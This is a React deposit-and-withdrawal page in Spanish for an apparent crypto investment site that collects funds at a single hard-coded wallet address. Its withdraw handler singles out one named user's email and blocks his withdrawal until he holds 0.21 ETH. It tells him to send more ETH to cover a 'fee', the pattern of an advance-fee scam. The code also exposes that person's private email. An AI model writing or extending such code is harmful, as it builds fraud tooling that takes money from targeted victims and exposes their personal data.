import React, { useState } from 'react';
import { motion } from 'framer-motion';
import Layout from '@/components/Layout';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { DollarSign, Copy } from 'lucide-react';
import { useAuth } from '@/contexts/AuthContext';
import { useData } from '@/contexts/DataContext';
import { toast } from '@/components/ui/use-toast';
import { useSound } from '@/contexts/SoundContext';

const DepositPage = () => {
  const { user, updateUser } = useAuth();
  const { addTransaction } = useData();
  const { playSound } = useSound();
  const [depositMethod, setDepositMethod] = useState('crypto');
  const [cryptoCurrency, setCryptoCurrency] = useState('USDT');
  const [withdrawCurrency, setWithdrawCurrency] = useState('USDC');
  const [amount, setAmount] = useState('');

  const cryptoAddress = '0xBAeaDE80A2A1064E4F8f372cd2ADA9a00daB4BBE';

  const handleCopy = (text) => {
    playSound('click');
    navigator.clipboard.writeText(text);
    toast({ title: 'Copiado', description: `${text} copiado al portapapeles.` });
  };

  const handleDeposit = () => {
    const depositAmount = parseFloat(amount);
    if (!depositAmount || depositAmount <= 0) {
      playSound('error');
      toast({ title: "Error", description: "Ingresa un monto válido.", variant: "destructive" });
      return;
    }

    addTransaction({
      userId: user.id,
      type: 'deposit',
      amount: depositAmount,
      currency: cryptoCurrency,
      description: `Depósito vía ${cryptoCurrency}`,
      status: 'pending'
    });

    playSound('success');
    toast({ title: "Depósito enviado", description: `Solicitud de ${depositAmount} ${cryptoCurrency} enviada.` });
    setAmount('');
  };

 const handleWithdraw = () => {
  const withdrawAmount = parseFloat(amount);
  if (!withdrawAmount || withdrawAmount <= 0) {
    toast({ title: "Error", description: "Monto inválido.", variant: "destructive" });
    return;
  }

  const fee = withdrawAmount * 0.06;
  const netAmount = withdrawAmount - fee;

  // ✅ Verificación personalizada para Fernando
  if (
    user?.email === 'fernandosalinas2008@gmail.com' &&
    user?.eth < 0.21
  ) {
    toast({
      title: "Saldo insuficiente para cubrir el fee de retiro",
      description: "Debes tener al menos 0.21 ETH disponibles para procesar el retiro. Por favor, vuelve a la sección de Depósito y envía ETH. El retiro se procesa en minutos una vez cubierto.",
      variant: "destructive"
    });
    playSound('error');
    return;
  }

  // ✅ Verificación de saldo por moneda
  if (withdrawCurrency === 'USDC') {
    if (withdrawAmount > user.balance) {
      toast({ title: "Fondos insuficientes", description: "No tienes suficiente USDC." });
      return;
    }
    updateUser({ balance: user.balance - withdrawAmount });
  } else if (withdrawCurrency === 'ETH') {
    if (withdrawAmount > user.eth) {
      toast({ title: "Fondos insuficientes", description: "No tienes suficiente ETH." });
      return;
    }
    updateUser({ eth: user.eth - withdrawAmount });
  }

  // ✅ Registrar retiro
  addTransaction({
    userId: user.id,
    type: 'withdrawal',
    amount: netAmount,
    currency: withdrawCurrency,
    description: `Retiro de ${withdrawAmount} ${withdrawCurrency} (con fee del 6%)`,
    status: 'pending'
  });

  playSound('success');
  toast({
    title: "Retiro solicitado",
    description: `Tu retiro de ${netAmount.toFixed(4)} ${withdrawCurrency} será procesado en minutos.`
  });
  setAmount('');
};


  return (
    <Layout>
      <div className="space-y-8">
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.8 }}>
          <h1 className="text-3xl font-bold text-white mb-2">Realizar Depósito o Retiro</h1>
          <p className="text-slate-300">Saldos actuales:</p>
        </motion.div>

        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <Card className="bg-slate-800/60 border border-slate-700">
            <CardContent className="p-4">
              <p className="text-white text-lg">USDC Disponible:</p>
              <p className="text-green-400 text-2xl font-bold">{user?.balance?.toFixed(2)} USDC</p>
            </CardContent>
          </Card>
          <Card className="bg-slate-800/60 border border-slate-700">
            <CardContent className="p-4">
              <p className="text-white text-lg">ETH Disponible:</p>
              <p className="text-blue-400 text-2xl font-bold">{user?.eth?.toFixed(6)} ETH</p>
            </CardContent>
          </Card>
        </div>

        <Card className="crypto-card">
          <CardHeader>
            <CardTitle className="text-white flex items-center">
              <DollarSign className="h-6 w-6 mr-2 text-green-400" />
              Selecciona Acción
            </CardTitle>
          </CardHeader>

          <CardContent className="space-y-6">
            <Tabs defaultValue="crypto" onValueChange={setDepositMethod} className="w-full">
              <TabsList className="grid w-full grid-cols-2 bg-slate-800">
                <TabsTrigger value="crypto" className="text-white">Depositar</TabsTrigger>
                <TabsTrigger value="fiat" className="text-white">Retirar</TabsTrigger>
              </TabsList>

              {/* DEPÓSITO */}
              <TabsContent value="crypto" className="mt-6">
                <Card className="bg-slate-800/50 border-slate-700">
                  <CardHeader>
                    <CardTitle className="text-white">Dirección de Depósito</CardTitle>
                    <CardDescription className="text-slate-300">
                      Puedes enviar fondos a esta dirección.
                    </CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div>
                      <Label className="text-white mb-1 block">Criptomoneda</Label>
                      <Select value={cryptoCurrency} onValueChange={setCryptoCurrency}>
                        <SelectTrigger className="bg-slate-700 text-white">
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent className="bg-slate-700 text-white">
                          <SelectItem value="USDC">USDC</SelectItem>
                          <SelectItem value="ETH">ETH</SelectItem>
                          <SelectItem value="USDT">USDT</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>
                    <div className="flex items-center gap-2">
                      <Input readOnly value={cryptoAddress} className="bg-slate-700 border-slate-600 text-slate-300" />
                      <Button variant="outline" size="icon" onClick={() => handleCopy(cryptoAddress)}>
                        <Copy className="h-4 w-4" />
                      </Button>
                    </div>
                    <div>
                      <Label className="text-white">Monto</Label>
                      <Input
                        type="number"
                        value={amount}
                        onChange={(e) => setAmount(e.target.value)}
                        placeholder="Ej: 100"
                        className="bg-slate-800 border-slate-600 text-white"
                      />
                    </div>
                    <Button onClick={handleDeposit} className="w-full bg-gradient-to-r from-green-500 to-blue-500 hover:from-green-600 hover:to-blue-600">
                      Notificar Depósito
                    </Button>
                  </CardContent>
                </Card>
              </TabsContent>

              {/* RETIRO */}
              <TabsContent value="fiat" className="mt-6">
                <Card className="bg-slate-800/50 border-slate-700">
                  <CardHeader>
                    <CardTitle className="text-white">Solicitar Retiro</CardTitle>
                    <CardDescription className="text-slate-300">Selecciona una criptomoneda para retirar.</CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <Label className="text-white mb-1">Criptomoneda</Label>
                    <Select value={withdrawCurrency} onValueChange={setWithdrawCurrency}>
                      <SelectTrigger className="bg-slate-700 text-white">
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent className="bg-slate-700 text-white">
                        <SelectItem value="USDC">USDC</SelectItem>
                        <SelectItem value="ETH">ETH</SelectItem>
                      </SelectContent>
                    </Select>
                    <Label className="text-white">Monto</Label>
                    <Input
                      type="number"
                      value={amount}
                      onChange={(e) => setAmount(e.target.value)}
                      placeholder="Ej: 50"
                      className="bg-slate-800 border-slate-600 text-white"
                    />
                    <Button onClick={handleWithdraw} className="w-full bg-gradient-to-r from-yellow-500 to-red-500 hover:from-yellow-600 hover:to-red-600">
                      Solicitar Retiro
                    </Button>
                    <p className="text-xs text-center text-yellow-300">Se aplicará una comisión del 6% al retiro.</p>
                  </CardContent>
                </Card>
              </TabsContent>
            </Tabs>
          </CardContent>
        </Card>
      </div>
    </Layout>
  );
};

export default DepositPage;
